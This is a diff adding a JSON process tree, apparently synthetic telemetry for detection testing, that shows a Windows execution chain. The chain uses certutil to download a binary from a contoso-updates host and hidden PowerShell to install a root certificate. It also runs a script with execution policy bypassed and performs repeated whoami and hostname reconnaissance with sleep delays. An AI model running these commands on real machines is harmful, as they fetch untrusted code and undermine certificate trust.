@@ -1,0 +1,227 @@
+{
+  "pid": 237603,
+  "ppid": 0,
+  "name": "cmd.exe",
+  "command": "cmd.exe /c \"echo runbook\"",
+  "children": [
+    {
+      "pid": 237605,
+      "ppid": 237603,
+      "name": "cmd.exe",
+      "command": "cmd.exe /c \"tasklist /svc\"",
+      "children": [
+        {
+          "pid": 237606,
+          "ppid": 237605,
+          "name": "certutil.exe",
+          "command": "certutil.exe -urlcache -split -f \"http://cdn.contoso-updates.com/support/collector.bin\" \"C:\\ProgramData\\Litware\\Assist\\relay.bin\"",
+          "children": [
+            {
+              "pid": 237609,
+              "ppid": 237606,
+              "name": "whoami.exe",
+              "command": "whoami.exe /priv > \"C:\\Users\\suresh.sharma\\AppData\\Local\\Temp\\who_e4b1b7a5.txt\"",
+              "children": [
+                {
+                  "pid": 237613,
+                  "ppid": 237609,
+                  "name": "powershell.exe",
+                  "command": "powershell.exe -NoProfile -WindowStyle Hidden -Command \"Start-Process -FilePath 'certutil.exe' -ArgumentList '-addstore CA \"C:\\Users\\Public\\corp_root.cer\"' -Wait\"",
+                  "children": [
+                    {
+                      "pid": 237615,
+                      "ppid": 237613,
+                      "name": "whoami.exe",
+                      "command": "whoami.exe /priv",
+                      "children": [
+                        {
+                          "pid": 237622,
+                          "ppid": 237615,
+                          "name": "powershell.exe",
+                          "command": "powershell.exe -NoProfile -WindowStyle Hidden -Command \"Start-Sleep -Seconds 5\"",
+                          "children": []
+                        }
+                      ]
+                    },
+                    {
+                      "pid": 237624,
+                      "ppid": 237613,
+                      "name": "hostname.exe",
+                      "command": "hostname.exe > \"C:\\Users\\suresh.sharma\\AppData\\Local\\Temp\\host_dfce6a84.txt\"",
+                      "children": [
+                        {
+                          "pid": 237625,
+                          "ppid": 237624,
+                          "name": "whoami.exe",
+                          "command": "whoami.exe /all",
+                          "children": [
+                            {
+                              "pid": 237626,
+                              "ppid": 237625,
+                              "name": "ping.exe",
+                              "command": "ping.exe -n 26 127.0.0.1 > nul",
+                              "children": [
+                                {
+                                  "pid": 237631,
+                                  "ppid": 237626,
+                                  "name": "whoami.exe",
+                                  "command": "whoami.exe /groups > \"C:\\Users\\suresh.sharma\\AppData\\Local\\Temp\\who_668aef0b.txt\"",
+                                  "children": []
+                                }
+                              ]
+                            }
+                          ]
+                        },
+                        {
+                          "pid": 237638,
+                          "ppid": 237624,
+                          "name": "hostname.exe",
+                          "command": "hostname.exe",
+                          "children": [
+                            {
+                              "pid": 237639,
+                              "ppid": 237638,
+                              "name": "hostname.exe",
+                              "command": "hostname.exe",
+                              "children": [
+                                {
+                                  "pid": 237646,
+                                  "ppid": 237639,
+                                  "name": "certutil.exe",
+                                  "command": "certutil.exe -dump \"C:\\Users\\suresh.sharma\\AppData\\Local\\Temp\\corp_root.cer\"",
+                                  "children": [
+                                    {
+                                      "pid": 237651,
+                                      "ppid": 237646,
+                                      "name": "ping.exe",
+                                      "command": "ping.exe -n 21 127.0.0.1 > nul",
+                                      "children": [
+                                        {
+                                          "pid": 237681,
+                                          "ppid": 237651,
+                                          "name": "powershell.exe",
+                                          "command": "powershell.exe -NoProfile -ExecutionPolicy Bypass -File \"C:\\Users\\Public\\RunDiagnostics_cadc84d3.ps1\" -Host \"WS-827\" -Mode Quick",
+                                          "children": [
+                                            {
+                                              "pid": 237684,
+                                              "ppid": 237681,
+                                              "name": "whoami.exe",
+                                              "command": "whoami.exe /priv > \"C:\\Users\\suresh.sharma\\AppData\\Local\\Temp\\who_3d676607.txt\"",
+                                              "children": [
+                                                {
+                                                  "pid": 237704,
+                                                  "ppid": 237684,
+                                                  "name": "choice.exe",
+                                                  "command": "choice.exe /d y /t 14 > nul",
+                                                  "children": [
+                                                    {
+                                                      "pid": 237705,
+                                                      "ppid": 237704,
+                                                      "name": "whoami.exe",
+                                                      "command": "whoami.exe /groups",
+                                                      "children": [
+                                                        {
+                                                          "pid": 237709,
+                                                          "ppid": 237705,
+                                                          "name": "whoami.exe",
+                                                          "command": "whoami.exe",
+                                                          "children": [
+                                                            {
+                                                              "pid": 237711,
+                                                              "ppid": 237709,
+                                                              "name": "choice.exe",
+                                                              "command": "choice.exe /d y /t 16 > nul",
+                                                              "children": []
+                                                            }
+                                                          ]
+                                                        }
+                                                      ]
+                                                    }
+                                                  ]
+                                                }
+                                              ]
+                                            }
+                                          ]
+                                        }
+                                      ]
+                                    }
+                                  ]
+                                }
+                              ]
+                            }
+                          ]
+                        }
+                      ]
+                    }
+                  ]
+                }
+              ]
+            }
+          ]
+        }
+      ]
+    },
+    {
+      "pid": 237652,
+      "ppid": 237603,
+      "name": "whoami.exe",
+      "command": "whoami.exe /priv > \"C:\\Users\\suresh.sharma\\AppData\\Local\\Temp\\who_c5b62e4a.txt\"",
+      "children": [
+        {
+          "pid": 237657,
+          "ppid": 237652,
+          "name": "ping.exe",
+          "command": "ping.exe -n 15 127.0.0.1 > nul",
+          "children": [
+            {
+              "pid": 237664,
+              "ppid": 237657,
+              "name": "hostname.exe",
+              "command": "hostname.exe > \"C:\\Users\\suresh.sharma\\AppData\\Local\\Temp\\host_eacda228.txt\"",
+              "children": [
+                {
+                  "pid": 237670,
+                  "ppid": 237664,
+                  "name": "choice.exe",
+                  "command": "choice.exe /d y /t 10 > nul",
+                  "children": [
+                    {
+                      "pid": 237674,
+                      "ppid": 237670,
+                      "name": "whoami.exe",
+                      "command": "whoami.exe /all",
+                      "children": []
+                    }
+                  ]
+                }
+              ]
+            }
+          ]
+        }
+      ]
+    },
+    {
+      "pid": 237691,
+      "ppid": 237603,
+      "name": "hostname.exe",
+      "command": "hostname.exe > \"C:\\Users\\suresh.sharma\\AppData\\Local\\Temp\\host_521ed712.txt\"",
+      "children": [
+        {
+          "pid": 237696,
+          "ppid": 237691,
+          "name": "choice.exe",
+          "command": "choice.exe /d y /t 9 > nul",
+          "children": [
+            {
+              "pid": 237700,
+              "ppid": 237696,
+              "name": "powershell.exe",
+              "command": "powershell.exe -NoProfile -WindowStyle Hidden -Command \"Start-Sleep -Seconds 16\"",
+              "children": []
+            }
+          ]
+        }
+      ]
+    }
+  ]
+}
